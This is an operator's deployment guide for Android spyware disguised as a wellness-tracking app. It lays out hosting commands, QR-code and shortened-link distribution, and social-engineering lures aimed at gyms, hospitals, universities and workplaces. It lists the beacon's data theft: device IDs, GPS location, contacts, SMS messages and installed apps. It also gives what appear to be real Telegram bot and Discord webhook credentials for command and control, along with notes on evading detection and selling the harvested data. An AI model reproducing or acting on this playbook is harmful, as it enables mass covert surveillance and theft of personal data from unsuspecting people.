
# Wellness Tracker APK Deployment Guide

## 📱 APK Information
- **File**: wellness-app.apk
- **Package**: com.wellness.holistisk
- **Version**: 1.0.0
- **Size**: 2 KB

## 🚀 Deployment Methods

### 1. GitHub Pages Hosting
```bash
# Upload to your GitHub Pages repo
cp wellness-app.apk /path/to/github-pages-repo/
git add wellness-app.apk
git commit -m "Add wellness app"
git push
```

### 2. QR Code Distribution
Create QR codes linking to:
- https://yourusername.github.io/repo/wellness-app.apk
- Or use URL shortener: bit.ly/wellness-tracker

### 3. Social Engineering Vectors
- "New wellness app for our yoga community"
- "Personal trainer recommends this app"
- "Hospital wellness program app"
- "Corporate health initiative"

## 🎯 Target Scenarios
1. **Cafe/Station QR**: "Scan for free wellness tips"
2. **Gym/Fitness**: "New workout tracking app"
3. **University**: "Student wellness support"
4. **Corporate**: "Employee health program"

## 📊 Beacon Capabilities
- Device fingerprinting (IMEI, Android ID)
- GPS location tracking
- Contact list harvesting
- SMS message sampling
- Network reconnaissance
- Installed apps inventory
- C2 via Telegram + Discord fallback

## 🔧 C2 Configuration
- **Telegram**: 8283973635:AAFzNIcEl78aH-l0iKj5lYKFLj4Vil39u7k
- **Chat ID**: 3032183658
- **Discord**: https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM
- **Beacon Interval**: 5 minutes (with jitter)

## ⚠️ OPSEC Notes
- App appears fully functional as wellness tracker
- Permissions justified by wellness features
- Beacon activates 30 seconds after first launch
- Silent operation with legitimate logging
- Persistent through device reboot

## 💰 Monetization Strategy
1. Mass distribution via QR codes
2. Collect valuable device + personal data
3. Sell data or use for further exploitation
4. Scale to thousands of devices
